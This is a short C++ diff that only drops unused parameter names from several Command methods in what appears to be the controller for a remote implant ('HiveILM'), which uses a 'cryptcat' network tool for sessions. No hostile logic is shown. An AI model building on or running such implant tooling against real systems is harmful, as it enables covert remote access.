@@ -36,7 +36,7 @@ extern HiveILM *myILMInstance;
 char cryptcat_path[] = "cryptcat";
 
 //*******************************************************************************
-void Command::Execute( Primitive::Activation& actvn, ProcessCmdAccumulator& acc, ProcessCmdResponse& resp )
+void Command::Execute( Primitive::Activation& actvn, ProcessCmdAccumulator& , ProcessCmdResponse& resp )
 {
 	struct send_buf sbuf;
 	struct recv_buf rbuf;
@@ -71,7 +71,7 @@ void Command::Execute( Primitive::Activation& actvn, ProcessCmdAccumulator& acc,
 }
 
 //*******************************************************************************
-void Command::Session( Primitive::Activation& actvn, ProcessCmdAccumulator& acc, ProcessCmdResponse& resp )
+void Command::Session( Primitive::Activation& actvn, ProcessCmdAccumulator&, ProcessCmdResponse& resp )
 {
 	struct send_buf sbuf;
 	struct recv_buf rbuf;
@@ -110,7 +110,7 @@ void Command::Session( Primitive::Activation& actvn, ProcessCmdAccumulator& acc,
 }
 
 //*******************************************************************************
-void Command::Exit( Primitive::Activation& actvn, ProcessCmdAccumulator& acc, ProcessCmdResponse& resp )
+void Command::Exit( Primitive::Activation&, ProcessCmdAccumulator&, ProcessCmdResponse& resp )
 {
 	struct send_buf sbuf;
 	struct recv_buf rbuf;
@@ -167,7 +167,7 @@ Command::ShutDown::ShutDown() {
 }
 
 //*******************************************************************************
-ProcessCmdResponse Command::ShutDown::Process(binary& arguments)
+ProcessCmdResponse Command::ShutDown::Process(binary&)
 {
     ProcessCmdResponse resp;
 	struct send_buf sbuf;
